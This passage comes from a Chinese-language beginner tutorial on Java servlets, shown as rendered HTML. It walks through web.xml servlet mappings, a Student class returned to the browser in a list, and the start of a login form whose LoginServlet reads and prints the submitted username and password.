后端资源的全类名，给出对应客户端的后端资源路径--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.liloker.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        与上面servlet资源名称hello相同，表示配套--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置客户端访问资源的路径，即url中的地址路径--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>step5：</strong>运行工程，在tomcat服务器这边可以看到前后端交互的结果，显示step3中的输出内容。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610172101540.png" alt="image-20210610172101540"></p><p>**step6:**在step3步骤的后端子类中，还可以进行与前端不同方式的交互方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span>   <span class="comment">//override就是子类重写父类的标识</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.service(req, resp); 子类继承父类的操作</span></span><br><span class="line">        <span class="comment">//这两个对象的实例是由浏览器发起调用，然后由tomcat容器创建的实例，然后这边就可以接收前端的数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;这是后端内容&quot;</span>);</span><br><span class="line">        <span class="comment">//重写该方法的目的就是为了，在运行这个程序时可以获取其请求对象和响应对象</span></span><br><span class="line"></span><br><span class="line">        String name = req.getParameter(<span class="string">&quot;name&quot;</span>);<span class="comment">//接收前端一个叫name的post参数</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;从前端接收到的值为&quot;</span>+name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//响应数据给前端</span></span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;hhh，这是响应给前端的数据~~~&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>step7：</strong> 客户端访问：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610182834953.png" alt="image-20210610182834953"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610182851268.png" alt="image-20210610182851268"></p><p>这里出现乱码是因为response响应对象的字符集与浏览器不一致导致的，在后面有解决方法</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610182934490.png" alt="image-20210610182934490"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610182924325.png" alt="image-20210610182924325"></p><h4 id="eg8-实现将java容器（数组，集合等对象）响应到浏览器端"><a href="#eg8-实现将java容器（数组，集合等对象）响应到浏览器端" class="headerlink" title="eg8. 实现将java容器（数组，集合等对象）响应到浏览器端"></a>eg8. 实现将java容器（数组，集合等对象）响应到浏览器端</h4><p>需求:<br>在后端创建5个学生对象，然后将这个5个学生对象添加到容器里面(数组、集合)<br>然后将集合对象响应到浏览器端</p><p><strong>step0：</strong>在eg7的前提下；</p><p><strong>step1：</strong>新建一个文件夹pojo，创建普通的学生class类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.liloker.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装一个学生对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过快捷键alt+ins生成其有参构造和无参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, String sex, String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同样快捷创建get和set</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//因为需要看到数据的最终结果，所以重写tostring方法</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//之所以这里可以使用tostring，是因为在java中如果一个类如果没有继承任何一个类，那么就默认继承一个Object的超类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建5个对象需求完成，接下来将5个对象添加到容器（集合，数组）中，这里可以使用泛型规范写代码，也可以不用</span></span><br><span class="line">    <span class="comment">//泛型还没学过，这里就先注释掉，改成在servlet之前创建的子类HelloServlet</span></span><br><span class="line"><span class="comment">//    public List&lt;Student&gt; getUsers()&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step2：</strong>可以在eg7创建的helloServlet子类中将5个对象添加到容器中的操作，并使用response继承的方法渲染到浏览器中，其中处理了中文乱码问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.liloker.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.liloker.pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时创建的类只是一个普通的类，想让其成为一个Servlet类就必须继承Servlet接口中的父类，继承后会继承父类中的所有东西</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//选择重载封装了http协议的方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> req 请求对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resp 响应对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException 使用斜杠星星自动生成的文档注释内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span>   <span class="comment">//override就是子类重写父类的标识</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        //super.service(req, resp); 子类继承父类的操作</span></span><br><span class="line"><span class="comment">//        //这两个对象的实例是由浏览器发起调用，然后由tomcat容器创建的实例，然后这边就可以接收前端的数据</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;这是后端内容&quot;);</span></span><br><span class="line"><span class="comment">//        //重写该方法的目的就是为了，在运行这个程序时可以获取其请求对象和响应对象</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        String name = req.getParameter(&quot;name&quot;);//接收前端一个叫name的post参数</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;从前端接收到的值为&quot;+name);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //响应数据给前端</span></span><br><span class="line"><span class="comment">//        resp.getWriter().print(&quot;hhh,servlet,这是响应给前端的数据~~~&quot;);</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//处理中文乱码 放在最前面</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建5个对象并且赋值</span></span><br><span class="line">        Student student1 = <span class="keyword">new</span> Student();</span><br><span class="line">        student1.setName(<span class="string">&quot;逍遥&quot;</span>);</span><br><span class="line">        student1.setAddress(<span class="string">&quot;天涯海角&quot;</span>);</span><br><span class="line">        student1.setAge(<span class="number">22</span>);</span><br><span class="line">        student1.setSex(<span class="string">&quot;男&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Student student2 = <span class="keyword">new</span> Student(<span class="string">&quot;233&quot;</span>,<span class="number">2</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;天涯&quot;</span>);</span><br><span class="line">        Student student3 = <span class="keyword">new</span> Student(<span class="string">&quot;233&quot;</span>,<span class="number">2</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;天涯&quot;</span>);</span><br><span class="line">        Student student4 = <span class="keyword">new</span> Student(<span class="string">&quot;233&quot;</span>,<span class="number">2</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;天涯&quot;</span>);</span><br><span class="line">        Student student5 = <span class="keyword">new</span> Student(<span class="string">&quot;233&quot;</span>,<span class="number">2</span>,<span class="string">&quot;男&quot;</span>,<span class="string">&quot;天涯&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个集合对象，java中提供了一种泛型写法</span></span><br><span class="line">        ArrayList&lt;Student&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;(); <span class="comment">//这里使用Student表示只能存放Student类型的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加学生对象到集合中</span></span><br><span class="line">        list.add(student1);</span><br><span class="line">        list.add(student2);</span><br><span class="line">        list.add(student3);</span><br><span class="line">        list.add(student4);</span><br><span class="line">        list.add(student5);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将集合对象响应到浏览器端</span></span><br><span class="line">        resp.getWriter().print(list);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610192700493.png" alt="image-20210610192700493"></p><h2 id="day4-实战原神游戏登录界面的前后端交互"><a href="#day4-实战原神游戏登录界面的前后端交互" class="headerlink" title="day4  实战原神游戏登录界面的前后端交互"></a>day4  实战原神游戏登录界面的前后端交互</h2><p><strong>明确需求：</strong>完成一个登录的需求:<br>前端要输入用户名和密码，然后点击一个登录按钮，然后会访问服务端，前端会把用户名和密码提交到服务端，然后后端会做对应的数据处理。</p><p>后端查询数据库user用户数据用户是否注册，而且要查询密码是否正确<br>容器来代替数据库，首先会创建一个容器对象然后在里面存放很多的用户数据<br>存放很多的用户对象，然后前端会提交用户名和密码</p><p>前端:需要去写一个登录页面用户输入框、密码输入框、登录按钮，这里用之前自己写的原神前端登录界面偷懒</p><p>前端基本上就是写一个htm1页面，html不能很好的处理后端响应的数据<br>基本上用的是模版引擎(jsp、 freemarker)</p><p><strong>step1：</strong>新建一个web动态工程并部署好tomcat（参考前面eg）</p><p><strong>step2：</strong>在web文件夹下新建一个jsp模板引擎文件，里面写html页面。页面中需要包含一个表单form标签，这里使用以前自己写的原神登录界面前端页面。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210611190616984.png" alt="image-20210611190616984"></p><p><strong>step3：</strong>在web工程中添加servlet包，在tomcat中也导入servlet包（参考前面eg）</p><p><strong>step4：</strong>创建一个叫loginservlet的class，并使其继承jar包中的HttpServlet父类。重写其中的service方法</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210611191930769.png" alt="image-20210611191930769"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.service(req, resp); 重写LoginServlet子类中继承来的server方法</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>step5：</strong>在web.xml中注册后端资源，在前端的form标签中添加路径，添加name属性值，在后端servlet的class中调用name属性的两个值，username和password，运行项目。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    注册后端资源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.liloker.servlet.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- 此处的/login是输入用户名和密码之后跳转到的前端接口url地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/web/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    \\这里添加name属性方便后端接收调用</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&quot;手机/邮箱/用户名&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- placeholder用于提示输入框中需要输入的内容 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.service(req, resp); 重写LoginServlet子类中继承来的server方法</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//接收前端传送的用户名和密码</span></span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password=req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;用户名为：&quot;</span>+username+<span class="string">&quot;  密码为：&quot;</span>+password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：在前端页面<a href="http://localhost:8080/web/jsp/login.jsp%E4%B8%AD%E6%8F%90%E4%BA%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%90%8E%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0form%E7%9A%84action%E5%9C%B0%E5%9D%80http://localhost:8080/web/login">http://localhost:8080/web/jsp/login.jsp中提交用户名和密码后会跳转到form的action地址http://localhost:8080/web/login</a> ，这里的login就是在xml中注册的前后端接口，前后端通过servlet-name来匹配，匹配到后端的class类，然后在后端对数据进行操作，比如这里IDEA上集成的服务器Tomcat可以对数据进行输出打印操作。</p><p><strong>step6：</strong>后端class中重写service方法，实现：将前端获得的用户名与密码与数据库中的数据进行匹配，对前端响应用户不存在或者密码错误，这里用容器来代替数据库，</p><p>LoginServlet.java中全部代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.liloker.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.liloker.pojo.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.service(req, resp); 重写LoginServlet子类中继承来的server方法</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//处理中文乱码</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//接收前端传送的用户名和密码</span></span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password=req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;用户名为：&quot;</span>+username+<span class="string">&quot;  密码为：&quot;</span>+password);</span><br><span class="line"></span><br><span class="line">        <span 